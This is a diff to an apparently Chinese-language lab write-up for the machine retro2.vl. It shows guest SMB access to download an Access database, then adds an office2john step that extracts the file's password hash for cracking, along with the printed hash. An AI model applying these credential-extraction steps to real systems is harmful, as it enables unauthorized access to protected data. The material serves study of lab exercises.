@@ -24,13 +24,19 @@ $ impacket-smbclient guest@retro2.vl -no-pass
 # get /DB/staff.accdb  //下载到本地
 # exit
 ```
+```
+$ office2john staff.accdb 
+staff.accdb:$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683f4d8c4e9faf7
+7d3c01f2433e56*7de0d4af8c54c33be322dbc860b68b4849f811196015a3f48a424a265d018235
+```
+#### 关键字为:$office$*2013*
 
 ### 2.在Windowns上挂载ProfessionalRetail.img,查看staff.accdb数据
 
 #### 把staff.accdb拉到Windowns
 ![还要继续吗](images/081103.png)
 
-
+![还要继续吗](images/0811031.png)
 #### staff文件需要密码，下面是破解密码：
 #### 从受密码保护的 Microsoft Office 文件中提取哈希值
 
